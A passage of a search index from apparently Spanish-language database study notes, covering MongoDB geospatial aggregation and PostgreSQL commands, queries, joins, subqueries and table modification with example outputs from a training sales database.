\"spherical\" : true , \"distanceMultiplier\" : 6371 } }, { \"$match\" : { \"dis\" : { $lt : 20 }}}, { \"$project\" : { \"_id\" : false , \"name\" : true , \"dis\" : true } } ] ) db . cities . aggregate ( [ { \"$geoNear\" : { \"near\" : [- 5.53888900000004 , 38.639167 ] , \"distanceField\" : \"dis\" , \"includeLocs\" : \"loc\" , \"spherical\" : true , \"maxDistance\" : 20 / 6371 , \"distanceMultiplier\" : 6371 } }, { \"$project\" : { \"_id\" : false , \"name\" : true , \"dis\" : true } } ] )","title":"Orden cercan\u00eda con max distancia"},{"location":"bases_datos/mongo/Mongo/#funciones","text":"function findCities ( long , lat , maxDist , minDist ) { return db . cities . aggregate ( [ { \"$geoNear\" : { \"near\" : [ long , lat ] , \"distanceField\" : \"dis\" , \"includeLocs\" : \"loc\" , \"spherical\" : true , \"maxDistance\" : maxDist / 6371 , \"minDistance\" : minDist / 6371 , \"distanceMultiplier\" : 6371 } }, { \"$project\" : { \"_id\" : false , \"name\" : true , \"dis\" : true } } ] ) } Aquesta funci\u00f3 nom\u00e9s funciona si estem utilitzant la BD geo , \u00e9s clar . findCities ( - 5.53888900000004 , 38.639167 , 40000 , 0 )","title":"Funciones"},{"location":"bases_datos/postgres/bases/","text":"Postgres Comandos para moverse psql 'nombre del gestor' # Conectar al gestor de tablas (base de datos) \\l listado # ls \\d 'tabla' # visualiza tabla =dir \\c 'base de datos' # cd entrar \\i 'url' # importar \\q # salir \\d f # ver funciones de usuario \\d f+ # ver funciones de usuario mas codigo \\h elp # ayuda \\h comando # ayuda de 1 comando en concreto. \\! clear #limpia pantalla \\c opy 'tabla' to 'nombre archivo(/ruta)' csv header # exportar tabla Querys Select Ej Tiene varias opciones, from, where, and, or y muchas m\u00e1s. select * from tabla; nos muestra toda la tabla (muy importante ; final). Mu\u00e9strame la columna de la tabla donde columna sea >= 50000 select columna / s from tabla where ( d\u00f3nde ) columna >= 50000 ; Mostrar filas de una tabla select count ( * ) from tabla ; Ejemplo and y or: select columna / s from tabla where ( columna condici\u00f3n and columna condici\u00f3n ) or ( columna condici\u00f3n ) ; like, not like Lo utilizamos para buscar en una columna partiendo de un car\u00e1cter o varios. Ilike es lo mismo que like pero busca el car\u00e1cter tanto en mayus como min\u00fascula % -- comod\u00edn vale por todos o 0 caracteres. _ -- comod\u00edn vale por 1 car\u00e1cter 'm%' -- primera letra es m '%m' -- \u00faltima letra es m '%m%' -- contiene m '_m%' -- segunda letra contiene m y la primera cualquier car\u00e1cter. ejemplos like /not like like any, all like any o like all sirve para comparar m\u00faltiples likes en uno solo, utilizando una array. LIKE ALL : compara como and LIKE ANY : compara como or Sintaxis: select * from tabla where columna like any ( array [ '% % %' , '%.%' ] ) ; select * from tabla where columna like '% % %' or columna like '%.%' ; select * from tabla where columna like all ( array [ '% % %' , '%.%' ] ) ; select * from tabla where columna like '% % %' and columna like '%.%' ; Similar to Similar to permite comparar texto similar a like pero nos deja insertar la opci\u00f3n or | dentro de sus opciones 'abc' SIMILAR TO 'abc' true 'abc' SIMILAR TO 'a' false 'abc' SIMILAR TO '%(b|d)%' true 'abc' SIMILAR TO '(b|c)%' false Expresiones regulares Poder utilizar expresiones regulares Operador Descripcion Ejemplo ~ Matches regular expression, case sensitive 'thomas' ~ '. thomas. ' ~* Matches regular expression, case insensitive 'thomas' ~ '. Thomas. ' !~ Does not match regular expression, case sensitive 'thomas' !~ '. Thomas. ' !~* Does not match regular expression, case insensitive 'thomas' !~ '. vadim. ' select * from tabla where columna ~ '.$' ; AS As se utiliza para cambiar el nombre a una columna o tabla temporalmente (sobre un select). Si deseas que el nombre tenga espacios en blanco colocarlo entre comillas dobles \"uno dos\" select oficina as ofi , dir as director , ( ventas * 100 / objetivo ) as porcentaje_cumplido from oficinas ; Limit, Offset Limit limita el string final a el n\u00famero que le indiques. SELECT columnas FROM tabla LIMIT 5 ; Offset especifica desde que fila empezara a mostrar el string. Si hay en una tabla 20 filas y a\u00f1ades un offset 5 mostrara 15 filas empezando por la fila 6. SELECT columnas FROM tabla OFFSET 5 ; Concatenar || substring Concatenar nos permite juntar 2 columnas o caracteres al resultado. columna1 || columna2 columna1 || ' car\u00e1cter o nada' || columna2 select columna1 || '-' || columna2 as alias from tabla ; Substring permite extraer caracteres de un resultado de fila. substring ( columna from 1(comienzo) for 2(largo) ) select nombre as \"Nombre\" , substring ( titulo from 4 for 7 ) || ' ' || substring ( titulo from 1 for 3 ) as \"Titulo\" , contrato as \"Contrato\" from repventas ; Extract Permite extraer una secci\u00f3n de la casilla para mostrarla, compararla etc.. Algunos de sus campos: year, month, day, hour, minute, second \u2026 select extract ( campo from columna ) from tabla ; select nombre , contrato from repventas where extract ( year from contrato ) < 1988 ; Distinct Te permite reagrupar los caracteres repetidos en una columna y muestra los iguales select distinct id_fab from productos ; Is null, Is not null Para ver los datos nulos o no nulos de una columna. Select columna from tabla where columna is null ; Round Redondea y elimina los n\u00fameros decimales. select round ( columna ) from tabla ; select round ( columna , 2 ) from tabla ; -- dos decimales 125.00 Order by Ordena columnas seg\u00fan orden ascendente (asc) o descendente (desc) select * from tabla order by columna1 asc , columna2 asc ; Condici\u00f3n por fecha select * from tabla where columna1 >= '2011-1-1' and columna1 <= '2011-12-31' ; Current_date Muestra los d\u00edas transcurridos de una fecha. select current_date - columnafecha from tabla ; Mostrar en a\u00f1os. select (( current_date - columnafecha ) / 365 ) from tabla ; Age Muestra el tiempo transcurrido en a\u00f1os meses y d\u00edas desde una fecha. select age ( columnafecha ) from tabla ; Coalesce, cast Coalesce convierte un null en un n\u00famero. Cast cambia el formato del caracter. poner null un 0 select coalesce ( columna , 0 ) as columna from tabla ; poner null un texto select coalesce ( cast ( columna as text ), 'texto-a-poner' ) as columna from tabla ; To_char Extrae el trozo de fecha deseado 'YYYY' a\u00f1os, 'mm' meses, 'dd' d\u00edas. select to_char ( columna , 'YYYY' ) = 1990 from tabla ; ( util despues de un where como condici\u00f3n ) Joins Left outer join Left outer join junta tablas de izquierda a derecha por un campo, en los campos que no coinciden se quedan en blanco. Podemos ir de izquierda a derecha con LEFT o de derecha a izquierda con RIGHT SELECT * FROM tabla1 LEFT OUTER JOIN tabla2 ON ( tabla1 . columna = tabla2 . columna ) -- A la tabla le puedes poner alias para facilitar escritura SELECT * FROM pedidos ped LEFT OUTER JOIN productos prod ON ( ped . fab = prod . id_fab ) -- Ver los clientes que han hecho pedidos y los que no saldr\u00e1n espacios en null. select * from clientes cli LEFT OUTER JOIN pedidos ped ON ( cli . num_clie = ped . clie ) order by cli . num_clie ; Inner join Inner join nos junta las tablas y nos muestra las filas que coinciden en la columna escogida. select * From tabla1 INNER JOIN tabla2 ON ( tabla1 . columna = tabla2 . columna ); --- SELECT * FROM oficinas o , repventas r WHERE o . dir = r . num_empl ; --- SELECT * FROM oficinas o INNER JOIN repventas r ON ( o . dir = r . num_empl ); Auto join Auto join es b\u00e1sicamente un join a una misma tabla lo \u00fanico diferente a de ser que 2 de las columnas coincidan en los datos. Se puede hacer tanto en INNER, LEFT o RIGHT Select * From tabla t1 LEFT OUTER JOIN tabla t2 on ( t1 . columna = t2 . columna ) Group by Group by nos permite agrupar varias filas en un grupo. Sus atributos son: sum () count (*) min () max() avg() \u2192 recomendable round ( avg ( columna ) ,2 ) Sintaxis Select From where Group by Order by SELECT clie , COUNT ( * ), SUM ( importe ), ROUND ( AVG ( importe ), 2 ), MIN ( importe ), MAX ( importe ), MIN ( fecha_pedido ), MAX ( fecha_pedido ) FROM pedidos GROUP BY clie ORDER BY SUM ( importe ) DESC ; Having Having es el filtrado que utiliza group by , se rige a sus normas de estructura, filtra por los atributos de group by. SELECT columna , COUNT ( * ) FROM tabla GROUP BY columna HAVING COUNT ( * ) > 4 ; ( Las columnas han de coincidir , si no dar\u00e1 error .) Subselects Subselects permite agregar partes de otra tabla en un mismo select, la respuesta del subselect siempre a deser 1 opci\u00f3n que se comparara con cada opci\u00f3n de la tabla inicial. select num_empl , nombre , ( select empresa from clientes where clientes . rep_clie = repventas . num_empl order by limite_credito desc limit 1 ), ( select max ( limite_credito ) from clientes where clientes . rep_clie = repventas . num_empl ) from repventas ; num_empl | nombre | empresa | max ----------+---------------+-------------------+---------- 105 | Bill Adams | Acme Mfg . | 50000 . 00 109 | Mary Jones | Holm & Landis | 55000 . 00 102 | Sue Smith | Fred Lewis Corp . | 65000 . 00 106 | Sam Clark | Jones Mfg . | 65000 . 00 104 | Bob Smith | Ian & Schmidt | 20000 . 00 101 | Dan Roberts | First Corp . | 65000 . 00 110 | Tom Snyder | Ace International | 35000 . 00 108 | Larry Fitch | Midwest Systems | 60000 . 00 103 | Paul Cruz | JCP Inc . | 50000 . 00 107 | Nancy Angelli | Peter Brothers | 40000 . 00 ( 10 rows ) All all es equivalente a un and, tienen que darse todos los casos ciertos de los elementos del subquery. En el ejemplo muestro las oficinas que todos sus vendedores tienen una superior al 55% del objetivo de la oficina. select * from oficinas where ( objetivo * 0 . 55 ) < all ( select cuota from repventas where oficina_rep = oficina ); oficina | ciudad | region | dir | objetivo | ventas ---------+---------+--------+-----+-----------+----------- 22 | Denver | Oeste | 108 | 300000 . 00 | 186042 . 00 13 | Atlanta | Este | 105 | 350000 . 00 | 367911 . 00 ( 2 filas ) Any Any es equivalente a un or, tiene que ser cierto alg\u00fan elemento de la subquery. ejemplo: mostrar oficinas que tienen alg\u00fan representante con la cuota de mas del 50% que el objetivo de su oficina. select * from oficinas where ( objetivo * 0 . 5 ) < any ( select cuota from repventas where oficina_rep = oficina ); oficina | ciudad | region | dir | objetivo | ventas ---------+----------+--------+-----+-----------+----------- 22 | Denver | Oeste | 108 | 300000 . 00 | 186042 . 00 11 | New York | Este | 106 | 575000 . 00 | 692637 . 00 13 | Atlanta | Este | 105 | 350000 . 00 | 367911 . 00 ( 3 filas ) otro ejemplo muy \u00fatil del any con un array select num_empl from repventas where nombre = any ( array [ 'Sue Smith' , 'Mary Jones' , 'Bill Adams' ]); num_empl ---------- 105 109 102 ( 3 filas ) Exists Exists es muy similar a IN, retorna true o false, si es true muestra la fila si no, no la muestra. Se tiene que relacionar dentro de la subquery la query original con la subquery, como se ve en el ejemplo. Ejemplo: todos los clientes que no han hecho ning\u00fan pedido. select num_clie , empresa from clientes where not exists ( select distinct clie from pedidos where num_clie = clie ); num_clie | empresa ----------+----------------- 2123 | Carter & Sons 2115 | Smithson Corp . 2121 | QMA Assoc . 2122 | Three - Way Lines 2119 | Solomon Inc . 2105 | AAA Investments ( 6 filas ) IN In nos permite comparar valores de diferentes filas o tablas. select producto , importe from pedidos where clie in ( select num_clie from clientes where num_clie = 2111 ); Union Union como su mismo nombre, une querys en una. Lo \u00fanico que hay que tener en cuenta es que las 2 querys han de tener el mismo n\u00famero y tipo de campos, es decir num\u00e9rica con num\u00e9rica, texto con texto etc.. En el caso de que un query tenga mas campos que otro, se puede poner uno adicional con NULL. Ejemplo: en el ejemplo se ve, una query que retorna el director con el n\u00famero de trabajadores que tiene, y en la otra los trabajadores por director. select dir . nombre as director , rep . nombre as esbirro , null as num_mascotas from repventas rep join repventas dir on ( rep . director = dir . num_empl ) UNION select dir . nombre as director , '-------' , count ( * ) as num_mascotas from repventas rep join repventas dir on ( rep . director = dir . num_empl ) group by dir . num_empl order by 1 , 3 desc ; director | esbirro | num_mascotas -------------+---------------+-------------- Bob Smith | Dan Roberts | Bob Smith | Bill Adams | Bob Smith | Paul Cruz | Bob Smith | ------- | 3 Dan Roberts | Tom Snyder | Dan Roberts | ------- | 1 Larry Fitch | Nancy Angelli | Larry Fitch | Sue Smith | Larry Fitch | ------- | 2 Sam Clark | Mary Jones | Sam Clark | Larry Fitch | Sam Clark | Bob Smith | Sam Clark | ------- | 3 Case when else end Case es la manera de a\u00f1adir condiciones en una query, similar a un if, se pueden a\u00f1adir tantas condiciones como se quieran, a\u00f1adiendo when's. SELECT nombre , CASE WHEN edad > 40 THEN 'Adulto' ELSE 'Joven' END FROM repventas ; nombre | case ---------------+-------- Bill Adams | Joven Mary Jones | Joven Sue Smith | Adulto Sam Clark | Adulto SELECT nombre , edad , ventas FROM repventas WHERE CASE WHEN edad < 40 THEN ventas > 200000 ELSE ventas > 300000 END ; nombre | edad | ventas -------------+------+----------- Bill Adams | 37 | 367911 . 00 Mary Jones | 31 | 392725 . 00 Sue Smith | 48 | 474050 . 00 Dan Roberts | 45 | 305673 . 00 Larry Fitch | 62 | 361865 . 00 Paul Cruz | 29 | 286775 . 00 ( 6 filas ) Forzar valor valor::typo fuerzas a un valor a tener un determinado tipo . SELECT insertar_usuarios ( '1' :: text );","title":"Postgres"},{"location":"bases_datos/postgres/bases/#postgres","text":"","title":"Postgres"},{"location":"bases_datos/postgres/bases/#comandos-para-moverse","text":"psql 'nombre del gestor' # Conectar al gestor de tablas (base de datos) \\l listado # ls \\d 'tabla' # visualiza tabla =dir \\c 'base de datos' # cd entrar \\i 'url' # importar \\q # salir \\d f # ver funciones de usuario \\d f+ # ver funciones de usuario mas codigo \\h elp # ayuda \\h comando # ayuda de 1 comando en concreto. \\! clear #limpia pantalla \\c opy 'tabla' to 'nombre archivo(/ruta)' csv header # exportar tabla","title":"Comandos para moverse"},{"location":"bases_datos/postgres/bases/#querys","text":"","title":"Querys"},{"location":"bases_datos/postgres/bases/#select-ej","text":"Tiene varias opciones, from, where, and, or y muchas m\u00e1s. select * from tabla; nos muestra toda la tabla (muy importante ; final). Mu\u00e9strame la columna de la tabla donde columna sea >= 50000 select columna / s from tabla where ( d\u00f3nde ) columna >= 50000 ; Mostrar filas de una tabla select count ( * ) from tabla ; Ejemplo and y or: select columna / s from tabla where ( columna condici\u00f3n and columna condici\u00f3n ) or ( columna condici\u00f3n ) ;","title":"Select Ej"},{"location":"bases_datos/postgres/bases/#like-not-like","text":"Lo utilizamos para buscar en una columna partiendo de un car\u00e1cter o varios. Ilike es lo mismo que like pero busca el car\u00e1cter tanto en mayus como min\u00fascula % -- comod\u00edn vale por todos o 0 caracteres. _ -- comod\u00edn vale por 1 car\u00e1cter 'm%' -- primera letra es m '%m' -- \u00faltima letra es m '%m%' -- contiene m '_m%' -- segunda letra contiene m y la primera cualquier car\u00e1cter. ejemplos like /not like","title":"like, not like"},{"location":"bases_datos/postgres/bases/#like-any-all","text":"like any o like all sirve para comparar m\u00faltiples likes en uno solo, utilizando una array. LIKE ALL : compara como and LIKE ANY : compara como or Sintaxis: select * from tabla where columna like any ( array [ '% % %' , '%.%' ] ) ; select * from tabla where columna like '% % %' or columna like '%.%' ; select * from tabla where columna like all ( array [ '% % %' , '%.%' ] ) ; select * from tabla where columna like '% % %' and columna like '%.%' ;","title":"like any, all"},{"location":"bases_datos/postgres/bases/#similar-to","text":"Similar to permite comparar texto similar a like pero nos deja insertar la opci\u00f3n or | dentro de sus opciones 'abc' SIMILAR TO 'abc' true 'abc' SIMILAR TO 'a' false 'abc' SIMILAR TO '%(b|d)%' true 'abc' SIMILAR TO '(b|c)%' false","title":"Similar to"},{"location":"bases_datos/postgres/bases/#expresiones-regulares","text":"Poder utilizar expresiones regulares Operador Descripcion Ejemplo ~ Matches regular expression, case sensitive 'thomas' ~ '. thomas. ' ~* Matches regular expression, case insensitive 'thomas' ~ '. Thomas. ' !~ Does not match regular expression, case sensitive 'thomas' !~ '. Thomas. ' !~* Does not match regular expression, case insensitive 'thomas' !~ '. vadim. ' select * from tabla where columna ~ '.$' ;","title":"Expresiones regulares"},{"location":"bases_datos/postgres/bases/#as","text":"As se utiliza para cambiar el nombre a una columna o tabla temporalmente (sobre un select). Si deseas que el nombre tenga espacios en blanco colocarlo entre comillas dobles \"uno dos\" select oficina as ofi , dir as director , ( ventas * 100 / objetivo ) as porcentaje_cumplido from oficinas ;","title":"AS"},{"location":"bases_datos/postgres/bases/#limit-offset","text":"Limit limita el string final a el n\u00famero que le indiques. SELECT columnas FROM tabla LIMIT 5 ; Offset especifica desde que fila empezara a mostrar el string. Si hay en una tabla 20 filas y a\u00f1ades un offset 5 mostrara 15 filas empezando por la fila 6. SELECT columnas FROM tabla OFFSET 5 ;","title":"Limit, Offset"},{"location":"bases_datos/postgres/bases/#concatenar-substring","text":"Concatenar nos permite juntar 2 columnas o caracteres al resultado. columna1 || columna2 columna1 || ' car\u00e1cter o nada' || columna2 select columna1 || '-' || columna2 as alias from tabla ; Substring permite extraer caracteres de un resultado de fila. substring ( columna from 1(comienzo) for 2(largo) ) select nombre as \"Nombre\" , substring ( titulo from 4 for 7 ) || ' ' || substring ( titulo from 1 for 3 ) as \"Titulo\" , contrato as \"Contrato\" from repventas ;","title":"Concatenar || substring"},{"location":"bases_datos/postgres/bases/#extract","text":"Permite extraer una secci\u00f3n de la casilla para mostrarla, compararla etc.. Algunos de sus campos: year, month, day, hour, minute, second \u2026 select extract ( campo from columna ) from tabla ; select nombre , contrato from repventas where extract ( year from contrato ) < 1988 ;","title":"Extract"},{"location":"bases_datos/postgres/bases/#distinct","text":"Te permite reagrupar los caracteres repetidos en una columna y muestra los iguales select distinct id_fab from productos ;","title":"Distinct"},{"location":"bases_datos/postgres/bases/#is-null-is-not-null","text":"Para ver los datos nulos o no nulos de una columna. Select columna from tabla where columna is null ;","title":"Is null, Is not null"},{"location":"bases_datos/postgres/bases/#round","text":"Redondea y elimina los n\u00fameros decimales. select round ( columna ) from tabla ; select round ( columna , 2 ) from tabla ; -- dos decimales 125.00","title":"Round"},{"location":"bases_datos/postgres/bases/#order-by","text":"Ordena columnas seg\u00fan orden ascendente (asc) o descendente (desc) select * from tabla order by columna1 asc , columna2 asc ;","title":"Order by"},{"location":"bases_datos/postgres/bases/#condicion-por-fecha","text":"select * from tabla where columna1 >= '2011-1-1' and columna1 <= '2011-12-31' ;","title":"Condici\u00f3n por fecha"},{"location":"bases_datos/postgres/bases/#current_date","text":"Muestra los d\u00edas transcurridos de una fecha. select current_date - columnafecha from tabla ; Mostrar en a\u00f1os. select (( current_date - columnafecha ) / 365 ) from tabla ;","title":"Current_date"},{"location":"bases_datos/postgres/bases/#age","text":"Muestra el tiempo transcurrido en a\u00f1os meses y d\u00edas desde una fecha. select age ( columnafecha ) from tabla ;","title":"Age"},{"location":"bases_datos/postgres/bases/#coalesce-cast","text":"Coalesce convierte un null en un n\u00famero. Cast cambia el formato del caracter. poner null un 0 select coalesce ( columna , 0 ) as columna from tabla ; poner null un texto select coalesce ( cast ( columna as text ), 'texto-a-poner' ) as columna from tabla ;","title":"Coalesce, cast"},{"location":"bases_datos/postgres/bases/#to_char","text":"Extrae el trozo de fecha deseado 'YYYY' a\u00f1os, 'mm' meses, 'dd' d\u00edas. select to_char ( columna , 'YYYY' ) = 1990 from tabla ; ( util despues de un where como condici\u00f3n )","title":"To_char"},{"location":"bases_datos/postgres/bases/#joins","text":"","title":"Joins"},{"location":"bases_datos/postgres/bases/#left-outer-join","text":"Left outer join junta tablas de izquierda a derecha por un campo, en los campos que no coinciden se quedan en blanco. Podemos ir de izquierda a derecha con LEFT o de derecha a izquierda con RIGHT SELECT * FROM tabla1 LEFT OUTER JOIN tabla2 ON ( tabla1 . columna = tabla2 . columna ) -- A la tabla le puedes poner alias para facilitar escritura SELECT * FROM pedidos ped LEFT OUTER JOIN productos prod ON ( ped . fab = prod . id_fab ) -- Ver los clientes que han hecho pedidos y los que no saldr\u00e1n espacios en null. select * from clientes cli LEFT OUTER JOIN pedidos ped ON ( cli . num_clie = ped . clie ) order by cli . num_clie ;","title":"Left outer join"},{"location":"bases_datos/postgres/bases/#inner-join","text":"Inner join nos junta las tablas y nos muestra las filas que coinciden en la columna escogida. select * From tabla1 INNER JOIN tabla2 ON ( tabla1 . columna = tabla2 . columna ); --- SELECT * FROM oficinas o , repventas r WHERE o . dir = r . num_empl ; --- SELECT * FROM oficinas o INNER JOIN repventas r ON ( o . dir = r . num_empl );","title":"Inner join"},{"location":"bases_datos/postgres/bases/#auto-join","text":"Auto join es b\u00e1sicamente un join a una misma tabla lo \u00fanico diferente a de ser que 2 de las columnas coincidan en los datos. Se puede hacer tanto en INNER, LEFT o RIGHT Select * From tabla t1 LEFT OUTER JOIN tabla t2 on ( t1 . columna = t2 . columna )","title":"Auto join"},{"location":"bases_datos/postgres/bases/#group-by","text":"Group by nos permite agrupar varias filas en un grupo. Sus atributos son: sum () count (*) min () max() avg() \u2192 recomendable round ( avg ( columna ) ,2 ) Sintaxis Select From where Group by Order by SELECT clie , COUNT ( * ), SUM ( importe ), ROUND ( AVG ( importe ), 2 ), MIN ( importe ), MAX ( importe ), MIN ( fecha_pedido ), MAX ( fecha_pedido ) FROM pedidos GROUP BY clie ORDER BY SUM ( importe ) DESC ;","title":"Group by"},{"location":"bases_datos/postgres/bases/#having","text":"Having es el filtrado que utiliza group by , se rige a sus normas de estructura, filtra por los atributos de group by. SELECT columna , COUNT ( * ) FROM tabla GROUP BY columna HAVING COUNT ( * ) > 4 ; ( Las columnas han de coincidir , si no dar\u00e1 error .)","title":"Having"},{"location":"bases_datos/postgres/bases/#subselects","text":"Subselects permite agregar partes de otra tabla en un mismo select, la respuesta del subselect siempre a deser 1 opci\u00f3n que se comparara con cada opci\u00f3n de la tabla inicial. select num_empl , nombre , ( select empresa from clientes where clientes . rep_clie = repventas . num_empl order by limite_credito desc limit 1 ), ( select max ( limite_credito ) from clientes where clientes . rep_clie = repventas . num_empl ) from repventas ; num_empl | nombre | empresa | max ----------+---------------+-------------------+---------- 105 | Bill Adams | Acme Mfg . | 50000 . 00 109 | Mary Jones | Holm & Landis | 55000 . 00 102 | Sue Smith | Fred Lewis Corp . | 65000 . 00 106 | Sam Clark | Jones Mfg . | 65000 . 00 104 | Bob Smith | Ian & Schmidt | 20000 . 00 101 | Dan Roberts | First Corp . | 65000 . 00 110 | Tom Snyder | Ace International | 35000 . 00 108 | Larry Fitch | Midwest Systems | 60000 . 00 103 | Paul Cruz | JCP Inc . | 50000 . 00 107 | Nancy Angelli | Peter Brothers | 40000 . 00 ( 10 rows )","title":"Subselects"},{"location":"bases_datos/postgres/bases/#all","text":"all es equivalente a un and, tienen que darse todos los casos ciertos de los elementos del subquery. En el ejemplo muestro las oficinas que todos sus vendedores tienen una superior al 55% del objetivo de la oficina. select * from oficinas where ( objetivo * 0 . 55 ) < all ( select cuota from repventas where oficina_rep = oficina ); oficina | ciudad | region | dir | objetivo | ventas ---------+---------+--------+-----+-----------+----------- 22 | Denver | Oeste | 108 | 300000 . 00 | 186042 . 00 13 | Atlanta | Este | 105 | 350000 . 00 | 367911 . 00 ( 2 filas )","title":"All"},{"location":"bases_datos/postgres/bases/#any","text":"Any es equivalente a un or, tiene que ser cierto alg\u00fan elemento de la subquery. ejemplo: mostrar oficinas que tienen alg\u00fan representante con la cuota de mas del 50% que el objetivo de su oficina. select * from oficinas where ( objetivo * 0 . 5 ) < any ( select cuota from repventas where oficina_rep = oficina ); oficina | ciudad | region | dir | objetivo | ventas ---------+----------+--------+-----+-----------+----------- 22 | Denver | Oeste | 108 | 300000 . 00 | 186042 . 00 11 | New York | Este | 106 | 575000 . 00 | 692637 . 00 13 | Atlanta | Este | 105 | 350000 . 00 | 367911 . 00 ( 3 filas ) otro ejemplo muy \u00fatil del any con un array select num_empl from repventas where nombre = any ( array [ 'Sue Smith' , 'Mary Jones' , 'Bill Adams' ]); num_empl ---------- 105 109 102 ( 3 filas )","title":"Any"},{"location":"bases_datos/postgres/bases/#exists","text":"Exists es muy similar a IN, retorna true o false, si es true muestra la fila si no, no la muestra. Se tiene que relacionar dentro de la subquery la query original con la subquery, como se ve en el ejemplo. Ejemplo: todos los clientes que no han hecho ning\u00fan pedido. select num_clie , empresa from clientes where not exists ( select distinct clie from pedidos where num_clie = clie ); num_clie | empresa ----------+----------------- 2123 | Carter & Sons 2115 | Smithson Corp . 2121 | QMA Assoc . 2122 | Three - Way Lines 2119 | Solomon Inc . 2105 | AAA Investments ( 6 filas )","title":"Exists"},{"location":"bases_datos/postgres/bases/#in","text":"In nos permite comparar valores de diferentes filas o tablas. select producto , importe from pedidos where clie in ( select num_clie from clientes where num_clie = 2111 );","title":"IN"},{"location":"bases_datos/postgres/bases/#union","text":"Union como su mismo nombre, une querys en una. Lo \u00fanico que hay que tener en cuenta es que las 2 querys han de tener el mismo n\u00famero y tipo de campos, es decir num\u00e9rica con num\u00e9rica, texto con texto etc.. En el caso de que un query tenga mas campos que otro, se puede poner uno adicional con NULL. Ejemplo: en el ejemplo se ve, una query que retorna el director con el n\u00famero de trabajadores que tiene, y en la otra los trabajadores por director. select dir . nombre as director , rep . nombre as esbirro , null as num_mascotas from repventas rep join repventas dir on ( rep . director = dir . num_empl ) UNION select dir . nombre as director , '-------' , count ( * ) as num_mascotas from repventas rep join repventas dir on ( rep . director = dir . num_empl ) group by dir . num_empl order by 1 , 3 desc ; director | esbirro | num_mascotas -------------+---------------+-------------- Bob Smith | Dan Roberts | Bob Smith | Bill Adams | Bob Smith | Paul Cruz | Bob Smith | ------- | 3 Dan Roberts | Tom Snyder | Dan Roberts | ------- | 1 Larry Fitch | Nancy Angelli | Larry Fitch | Sue Smith | Larry Fitch | ------- | 2 Sam Clark | Mary Jones | Sam Clark | Larry Fitch | Sam Clark | Bob Smith | Sam Clark | ------- | 3","title":"Union"},{"location":"bases_datos/postgres/bases/#case-when-else-end","text":"Case es la manera de a\u00f1adir condiciones en una query, similar a un if, se pueden a\u00f1adir tantas condiciones como se quieran, a\u00f1adiendo when's. SELECT nombre , CASE WHEN edad > 40 THEN 'Adulto' ELSE 'Joven' END FROM repventas ; nombre | case ---------------+-------- Bill Adams | Joven Mary Jones | Joven Sue Smith | Adulto Sam Clark | Adulto SELECT nombre , edad , ventas FROM repventas WHERE CASE WHEN edad < 40 THEN ventas > 200000 ELSE ventas > 300000 END ; nombre | edad | ventas -------------+------+----------- Bill Adams | 37 | 367911 . 00 Mary Jones | 31 | 392725 . 00 Sue Smith | 48 | 474050 . 00 Dan Roberts | 45 | 305673 . 00 Larry Fitch | 62 | 361865 . 00 Paul Cruz | 29 | 286775 . 00 ( 6 filas )","title":"Case when else end"},{"location":"bases_datos/postgres/bases/#forzar-valor","text":"valor::typo fuerzas a un valor a tener un determinado tipo . SELECT insertar_usuarios ( '1' :: text );","title":"Forzar valor"},{"location":"bases_datos/postgres/modificaciones/","text":"Modificaci\u00f3n tablas A\u00f1adir filas Copiar tabla Update Actualizar filas Actualizar nombre de columna Cambiar codificaci\u00f3n de caracteres Delete Crear tablas CONSTRAINTS Primary Key Default Unique Check Serial Foreign key On Delete, On Update Restrict Cascade Set Default, null Inherits Alter Table A\u00f1adir filas copy oficinas ( oficina , ciudad , region , dir , objetivo , ventas ) FROM stdin ; -- cal entrar les dades separades per TAB. -- Cada ENTER \u00e9s un nou registre; -- Per acabar posar \\. COPY oficinas ( oficina , ciudad , region , dir , objetivo , ventas ) FROM stdin ; 22 Denver Oeste 108 300000 . 00 186042 . 00 11 New York Este 106 575000 . 00 692637 . 00 12 Chicago Este 104 800000 . 00 735042 . 00 13 Atlanta Este 105 350000 . 00 367911 . 00 21 Los Angeles Oeste 108 725000 . 00 835915 . 00 \\ . INSERT INTO \"TABLA\" VALUES ( '999999' , '2017-01-01' , '9999' , '106' , 'rei' , '2a44l' , '7' , '31500.00' ); INSERT INTO peliculas ( code , title , did , date_prod , kind ) VALUES ( 'B6717' , 'Tampopo' , 110 , '1985-02-10' , 'Comedy' ), ( 'HG120' , 'The Dinner Game' , 140 , DEFAULT , 'Comedy' ); Copiar tabla Copiar tabla identica. create table copia_rep as select * from repventas ; Copiar los datos de una tabla en otra ( han de coincidir los tipos ). insert into tabla_existente ( select * from repventas ); Update Actualizar filas Al actualizar una fila tenemos que ir con cuidado ya que tenemos que hacer un select que solo salgan las filasque quieres modificar, si no se renombrara toda la columna que se muestre. Set \u2192 se refiere a lo que quieres modificar where \u2192 Depende de este where para modificar 1 o m\u00e1s filas ya que el n\u00famero de filas que se muestran se modifica en el campo set indicado sintaxis update tabla set columna - a - modificar = resultado_nuevo where columna - que - filtro = fila_que_quieres_modificar ; update pedidos set clie = 9999 where num_pedido = 999999 ; update clientes set rep_clie = ( select num_empl from repventas where nombre = 'Mary Jones' ), limite_credito = 60000 where empresa = 'Acme Mfg.' ; Actualizar filtrando con join simple. update repventas dir set cuota = ( select min ( cuota ) from repventas where oficina_rep = dir . oficina_rep ) from oficinas of where dir . num_empl = of . dir and cuota > any ( select cuota from repventas rep where of . oficina = rep . oficina_rep ); Cuando tienes que fltrar con una join complicada es mejor aislarla en una tabla temporal. with t as ( select dir . num_empl as empl from repventas dir join oficinas of on ( dir . num_empl = of . dir ) where cuota > any ( select cuota from repventas rep where of . oficina = rep . oficina_rep ) ) update repventas set titulo = ( select min ( cuota ) from repventas where oficina_rep = dir . oficina_rep ) where num_empl in ( select empl from t ); Actualizar nombre de columna alter table mi - tabla rename column nombre - antiguo to nombre - nuevo ; Cambiar codificaci\u00f3n de caracteres update pg_database set encoding = 6 where datname = 'TABLA' ; -- (utf-8) update pg_database set datcollate = 'es_ES.UTF-8' where datname = 'TABLA' ; update pg_database set datctype = 'es_ES.UTF-8' where datname = 'TABLA' ; Delete -- borrar tabla drop table copia_clie ; -- borrar base de datos drop database training ; Al usar delete hay que acordarse siempre de poner el where , en caso contrario borraremos todos los datos de la tabla. -- borrar fila delete from copia_rep where num_empl = 104 ; Crear tablas CONSTRAINTS Es poden posar a cada columna o al final de la creaci\u00f3 de la taula, mirar documentaci\u00f3 Postgresql. NOT NULL : En la columno no puede haber un valor null. PRIMARY KEY : clave primaria nopuede ser repetida en la misma columna ni haber null. DEFAULT : poner u valor por defecto. UNIQUE : cada valor a de ser unico en la columna, puede ser null tambi\u00e9n. CHECK : comprueba que los valores cumplan una condici\u00f3n. 